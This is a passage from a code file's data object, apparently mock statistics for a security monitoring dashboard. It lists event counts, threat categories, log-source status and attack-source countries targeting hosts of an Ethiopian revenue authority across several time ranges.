      { source: 'Windows servers', count: 192800, percentage: 13.0, status: 'healthy' },
      { source: 'Active Directory', count: 281400, percentage: 19.0, status: 'healthy' },
      { source: 'DNS and DHCP', count: 148290, percentage: 10.0, status: 'healthy' },
      { source: 'Firewall', count: 222400, percentage: 15.0, status: 'healthy' },
      { source: 'Routers and switches', count: 59300, percentage: 4.0, status: 'healthy' },
      { source: 'Web server and applications', count: 88900, percentage: 6.0, status: 'healthy' },
      { source: 'Database servers', count: 59300, percentage: 4.0, status: 'healthy' },
      { source: 'Email security', count: 44500, percentage: 3.0, status: 'healthy' },
      { source: 'VPN', count: 29600, percentage: 2.0, status: 'healthy' },
      { source: 'Linux servers', count: 14800, percentage: 1.0, status: 'delayed' },
      { source: 'Other supported sources', count: 420, percentage: 0.0, status: 'healthy' }
    ],
    incidentsBySeverity: [
      { severity: 'critical', count: 2, percentage: 28.6, color: '#EF4444' },
      { severity: 'high', count: 3, percentage: 42.8, color: '#F97316' },
      { severity: 'medium', count: 1, percentage: 14.3, color: '#F59E0B' },
      { severity: 'low', count: 1, percentage: 14.3, color: '#3B82F6' }
    ],
    geoAttackSources: [
      { country: 'Ethiopia (Internal/Anomalous)', countryCode: 'ET', eventCount: 1420, alertCount: 8, lat: 9.03, lng: 38.74, topTargetAsset: 'DC01-HQ.revenue.gov.et', topAttackVector: 'Internal lateral movement / Bad credentials' },
      { country: 'Netherlands', countryCode: 'NL', eventCount: 890, alertCount: 5, lat: 52.13, lng: 5.29, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'Automated SQL injection probes' },
      { country: 'United States', countryCode: 'US', eventCount: 740, alertCount: 4, lat: 37.09, lng: -95.71, topTargetAsset: 'VPN-GW-ADDIS', topAttackVector: 'VPN brute force / Password spraying' },
      { country: 'Germany', countryCode: 'DE', eventCount: 560, alertCount: 3, lat: 51.16, lng: 10.45, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'Path traversal / LFI scans' },
      { country: 'China', countryCode: 'CN', eventCount: 510, alertCount: 4, lat: 35.86, lng: 104.19, topTargetAsset: 'FW-PERIMETER-01', topAttackVector: 'Perimeter port scanning' },
      { country: 'Russian Federation', countryCode: 'RU', eventCount: 480, alertCount: 6, lat: 61.52, lng: 105.31, topTargetAsset: 'WS-FINANCE-019', topAttackVector: 'Cobalt Strike C2 beacon endpoint' },
      { country: 'United Kingdom', countryCode: 'GB', eventCount: 320, alertCount: 2, lat: 55.37, lng: -3.43, topTargetAsset: 'EXCHANGE-01.revenue.gov.et', topAttackVector: 'Phishing campaign relay' }
    ]
  },
  'Last 15 Days': {
    totalEvents: 21840400,
    totalEventsChangePct: 2.1,
    criticalEvents: 642,
    highEvents: 4120,
    securityIncidents: 34,
    incidentsChangePct: -5.5,
    eventsOverTime: [
      { time: 'Day 1', total: 1420000, critical: 42, high: 280 },
      { time: 'Day 3', total: 1480000, critical: 38, high: 260 },
      { time: 'Day 5', total: 1510000, critical: 49, high: 295 },
      { time: 'Day 7', total: 1390000, critical: 35, high: 250 },
      { time: 'Day 9', total: 1440000, critical: 44, high: 275 },
      { time: 'Day 11', total: 1530000, critical: 51, high: 310 },
      { time: 'Day 13', total: 1460000, critical: 40, high: 285 },
      { time: 'Day 15', total: 1482910, critical: 48, high: 312 }
    ],
    eventTypesBreakdown: [
      { category: 'Authentication', count: 7200000, percentage: 33, color: '#3B82F6' },
      { category: 'Network', count: 5460000, percentage: 25, color: '#06B6D4' },
      { category: 'Malware', count: 2620000, percentage: 12, color: '#EF4444' },
      { category: 'Web Application', count: 2180000, percentage: 10, color: '#F97316' },
      { category: 'System', count: 1740000, percentage: 8, color: '#8B5CF6' },
      { category: 'Endpoint', count: 1310000, percentage: 6, color: '#10B981' },
      { category: 'DNS and DHCP', count: 870000, percentage: 4, color: '#F59E0B' },
      { category: 'Other', count: 460400, percentage: 2, color: '#64748B' }
    ],
    topThreatCategories: [
      { category: 'Brute-force attempts', count: 114000, percentage: 29 },
      { category: 'Malware detection', count: 78000, percentage: 20 },
      { category: 'Suspicious login activity', count: 62000, percentage: 16 },
      { category: 'Web application attacks', count: 54000, percentage: 14 },
      { category: 'Unusual outbound traffic', count: 35000, percentage: 9 },
      { category: 'Data exfiltration indicators', count: 23000, percentage: 6 },
      { category: 'Privilege escalation indicators', count: 15000, percentage: 4 },
      { category: 'Suspicious DNS activity', count: 11000, percentage: 3 }
    ],
    eventsBySource: [
      { source: 'Windows endpoints', count: 5020000, percentage: 23.0, status: 'healthy' },
      { source: 'Windows servers', count: 2840000, percentage: 13.0, status: 'healthy' },
      { source: 'Active Directory', count: 4150000, percentage: 19.0, status: 'healthy' },
      { source: 'DNS and DHCP', count: 2180000, percentage: 10.0, status: 'healthy' },
      { source: 'Firewall', count: 3280000, percentage: 15.0, status: 'healthy' },
      { source: 'Routers and switches', count: 870000, percentage: 4.0, status: 'healthy' },
      { source: 'Web server and applications', count: 1310000, percentage: 6.0, status: 'healthy' },
      { source: 'Database servers', count: 870000, percentage: 4.0, status: 'healthy' },
      { source: 'Email security', count: 650000, percentage: 3.0, status: 'healthy' },
      { source: 'VPN', count: 440000, percentage: 2.0, status: 'healthy' },
      { source: 'Linux servers', count: 220000, percentage: 1.0, status: 'delayed' },
      { source: 'Other supported sources', count: 10400, percentage: 0.0, status: 'healthy' }
    ],
    incidentsBySeverity: [
      { severity: 'critical', count: 8, percentage: 23.5, color: '#EF4444' },
      { severity: 'high', count: 14, percentage: 41.2, color: '#F97316' },
      { severity: 'medium', count: 8, percentage: 23.5, color: '#F59E0B' },
      { severity: 'low', count: 4, percentage: 11.8, color: '#3B82F6' }
    ],
    geoAttackSources: [
      { country: 'Ethiopia (Internal/Anomalous)', countryCode: 'ET', eventCount: 19400, alertCount: 84, lat: 9.03, lng: 38.74, topTargetAsset: 'DC01-HQ.revenue.gov.et', topAttackVector: 'Internal policy violations & privilege tests' },
      { country: 'Netherlands', countryCode: 'NL', eventCount: 12400, alertCount: 62, lat: 52.13, lng: 5.29, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'Web application vulnerability probing' },
      { country: 'United States', countryCode: 'US', eventCount: 10800, alertCount: 58, lat: 37.09, lng: -95.71, topTargetAsset: 'VPN-GW-ADDIS', topAttackVector: 'Automated credential stuffing' },
      { country: 'Germany', countryCode: 'DE', eventCount: 8200, alertCount: 42, lat: 51.16, lng: 10.45, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'Directory traversal & API discovery' },
      { country: 'China', countryCode: 'CN', eventCount: 7800, alertCount: 49, lat: 35.86, lng: 104.19, topTargetAsset: 'FW-PERIMETER-01', topAttackVector: 'Port sweep & protocol fuzzing' },
      { country: 'Russian Federation', countryCode: 'RU', eventCount: 6900, alertCount: 55, lat: 61.52, lng: 105.31, topTargetAsset: 'WS-FINANCE-019', topAttackVector: 'Targeted malware & C2 beacons' }
    ]
  },
  'Last Month': {
    totalEvents: 43150000,
    totalEventsChangePct: -1.4,
    criticalEvents: 1280,
    highEvents: 8430,
    securityIncidents: 68,
    incidentsChangePct: -11.7,
    eventsOverTime: [
      { time: 'Sep 01 - 07', total: 10100000, critical: 310, high: 1980 },
      { time: 'Sep 08 - 14', total: 10850000, critical: 340, high: 2150 },
      { time: 'Sep 15 - 21', total: 11200000, critical: 325, high: 2210 },
      { time: 'Sep 22 - 30', total: 11000000, critical: 305, high: 2090 }
    ],
    eventTypesBreakdown: [
      { category: 'Authentication', count: 14240000, percentage: 33, color: '#3B82F6' },
      { category: 'Network', count: 10790000, percentage: 25, color: '#06B6D4' },
      { category: 'Malware', count: 5180000, percentage: 12, color: '#EF4444' },
      { category: 'Web Application', count: 4315000, percentage: 10, color: '#F97316' },
      { category: 'System', count: 3450000, percentage: 8, color: '#8B5CF6' },
      { category: 'Endpoint', count: 2590000, percentage: 6, color: '#10B981' },
      { category: 'DNS and DHCP', count: 1725000, percentage: 4, color: '#F59E0B' },
      { category: 'Other', count: 860000, percentage: 2, color: '#64748B' }
    ],
    topThreatCategories: [
      { category: 'Brute-force attempts', count: 224000, percentage: 28 },
      { category: 'Malware detection', count: 158000, percentage: 20 },
      { category: 'Suspicious login activity', count: 126000, percentage: 16 },
      { category: 'Web application attacks', count: 110000, percentage: 14 },
      { category: 'Unusual outbound traffic', count: 71000, percentage: 9 },
      { category: 'Data exfiltration indicators', count: 48000, percentage: 6 },
      { category: 'Privilege escalation indicators', count: 32000, percentage: 4 },
      { category: 'Suspicious DNS activity', count: 24000, percentage: 3 }
    ],
    eventsBySource: [
      { source: 'Windows endpoints', count: 9924500, percentage: 23.0, status: 'healthy' },
      { source: 'Windows servers', count: 5609500, percentage: 13.0, status: 'healthy' },
      { source: 'Active Directory', count: 8198500, percentage: 19.0, status: 'healthy' },
      { source: 'DNS and DHCP', count: 4315000, percentage: 10.0, status: 'healthy' },
      { source: 'Firewall', count: 6472500, percentage: 15.0, status: 'healthy' },
      { source: 'Routers and switches', count: 1726000, percentage: 4.0, status: 'healthy' },
      { source: 'Web server and applications', count: 2589000, percentage: 6.0, status: 'healthy' },
      { source: 'Database servers', count: 1726000, percentage: 4.0, status: 'healthy' },
      { source: 'Email security', count: 1294500, percentage: 3.0, status: 'healthy' },
      { source: 'VPN', count: 863000, percentage: 2.0, status: 'healthy' },
      { source: 'Linux servers', count: 431500, percentage: 1.0, status: 'delayed' },
      { source: 'Other supported sources', count: 20000, percentage: 0.0, status: 'healthy' }
    ],
    incidentsBySeverity: [
      { severity: 'critical', count: 15, percentage: 22.1, color: '#EF4444' },
      { severity: 'high', count: 28, percentage: 41.2, color: '#F97316' },
      { severity: 'medium', count: 17, percentage: 25.0, color: '#F59E0B' },
      { severity: 'low', count: 8, percentage: 11.7, color: '#3B82F6' }
    ],
    geoAttackSources: [
      { country: 'Ethiopia (Internal/Anomalous)', countryCode: 'ET', eventCount: 38200, alertCount: 165, lat: 9.03, lng: 38.74, topTargetAsset: 'DC01-HQ.revenue.gov.et', topAttackVector: 'Internal credentials & misconfigurations' },
      { country: 'Netherlands', countryCode: 'NL', eventCount: 24500, alertCount: 120, lat: 52.13, lng: 5.29, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'Automated vulnerability testing' },
      { country: 'United States', countryCode: 'US', eventCount: 21800, alertCount: 115, lat: 37.09, lng: -95.71, topTargetAsset: 'VPN-GW-ADDIS', topAttackVector: 'Credential stuffing' },
      { country: 'Germany', countryCode: 'DE', eventCount: 16400, alertCount: 82, lat: 51.16, lng: 10.45, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'API endpoint enumeration' },
      { country: 'China', countryCode: 'CN', eventCount: 15200, alertCount: 95, lat: 35.86, lng: 104.19, topTargetAsset: 'FW-PERIMETER-01', topAttackVector: 'Perimeter scanning' },
      { country: 'Russian Federation', countryCode: 'RU', eventCount: 13900, alertCount: 105, lat: 61.52, lng: 105.31, topTargetAsset: 'WS-FINANCE-019', topAttackVector: 'Spear-phishing & C2 traffic' }
    ]
  },
  'Last 3 Months': {
    totalEvents: 131240000,
    totalEventsChangePct: 6.8,
    criticalEvents: 3920,
    highEvents: 25600,
    securityIncidents: 214,
    incidentsChangePct: 8.1,
    eventsOverTime: [
      { time: 'July 2026', total: 42100000, critical: 1220, high: 8100 },
      { time: 'August 2026', total: 45990000, critical: 1420, high: 9070 },
      { time: 'September 2026', total: 43150000, critical: 1280, high: 8430 }
    ],
    eventTypesBreakdown: [
      { category: 'Authentication', count: 43309200, percentage: 33, color: '#3B82F6' },
      { category: 'Network', count: 32810000, percentage: 25, color: '#06B6D4' },
      { category: 'Malware', count: 15748800, percentage: 12, color: '#EF4444' },
      { category: 'Web Application', count: 13124000, percentage: 10, color: '#F97316' },
      { category: 'System', count: 10499200, percentage: 8, color: '#8B5CF6' },
      { category: 'Endpoint', count: 7874400, percentage: 6, color: '#10B981' },
      { category: 'DNS and DHCP', count: 5249600, percentage: 4, color: '#F59E0B' },
      { category: 'Other', count: 2624800, percentage: 2, color: '#64748B' }
    ],
    topThreatCategories: [
      { category: 'Brute-force attempts', count: 680000, percentage: 28 },
      { category: 'Malware detection', count: 480000, percentage: 20 },
      { category: 'Suspicious login activity', count: 390000, percentage: 16 },
      { category: 'Web application attacks', count: 340000, percentage: 14 },
      { category: 'Unusual outbound traffic', count: 220000, percentage: 9 },
      { category: 'Data exfiltration indicators', count: 145000, percentage: 6 },
      { category: 'Privilege escalation indicators', count: 98000, percentage: 4 },
      { category: 'Suspicious DNS activity', count: 72000, percentage: 3 }
    ],
    eventsBySource: [
      { source: 'Windows endpoints', count: 30185200, percentage: 23.0, status: 'healthy' },
      { source: 'Windows servers', count: 17061200, percentage: 13.0, status: 'healthy' },
      { source: 'Active Directory', count: 24935600, percentage: 19.0, status: 'healthy' },
      { source: 'DNS and DHCP', count: 13124000, percentage: 10.0, status: 'healthy' },
      { source: 'Firewall', count: 19686000, percentage: 15.0, status: 'healthy' },
      { source: 'Routers and switches', count: 5249600, percentage: 4.0, status: 'healthy' },
      { source: 'Web server and applications', count: 7874400, percentage: 6.0, status: 'healthy' },
      { source: 'Database servers', count: 5249600, percentage: 4.0, status: 'healthy' },
      { source: 'Email security', count: 3937200, percentage: 3.0, status: 'healthy' },
      { source: 'VPN', count: 2624800, percentage: 2.0, status: 'healthy' },
      { source: 'Linux servers', count: 1312400, percentage: 1.0, status: 'delayed' },
      { source: 'Other supported sources', count: 60000, percentage: 0.0, status: 'healthy' }
    ],
    incidentsBySeverity: [
      { severity: 'critical', count: 46, percentage: 21.5, color: '#EF4444' },
      { severity: 'high', count: 88, percentage: 41.1, color: '#F97316' },
      { severity: 'medium', count: 54, percentage: 25.2, color: '#F59E0B' },
      { severity: 'low', count: 26, percentage: 12.2, color: '#3B82F6' }
    ],
    geoAttackSources: [
      { country: 'Ethiopia (Internal/Anomalous)', countryCode: 'ET', eventCount: 114000, alertCount: 480, lat: 9.03, lng: 38.74, topTargetAsset: 'DC01-HQ.revenue.gov.et', topAttackVector: 'Internal credentials & misconfigurations' },
      { country: 'Netherlands', countryCode: 'NL', eventCount: 74000, alertCount: 360, lat: 52.13, lng: 5.29, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'Automated vulnerability testing' },
      { country: 'United States', countryCode: 'US', eventCount: 65000, alertCount: 330, lat: 37.09, lng: -95.71, topTargetAsset: 'VPN-GW-ADDIS', topAttackVector: 'Credential stuffing' },
      { country: 'Germany', countryCode: 'DE', eventCount: 49000, alertCount: 240, lat: 51.16, lng: 10.45, topTargetAsset: 'WEB-ETAX-PRD01', topAttackVector: 'API endpoint enumeration' },
      { country: 'China', countryCode: 'CN', eventCount: 46000, alertCount: 290, lat: 35.86, lng: 104.19, topTargetAsset: 'FW-PERIMETER-01', topAttackVector: 'Perimeter scanning' },
      { country: 'Russian Federation', countryCode: 'RU', eventCount: 41000, alertCount: 310, lat: 61.52, lng: 105.31, topTargetAsset: 'WS-FINANCE-019', topAttackVector: 'Spear-phishing & C2 traffic' }
    ]
  }
};
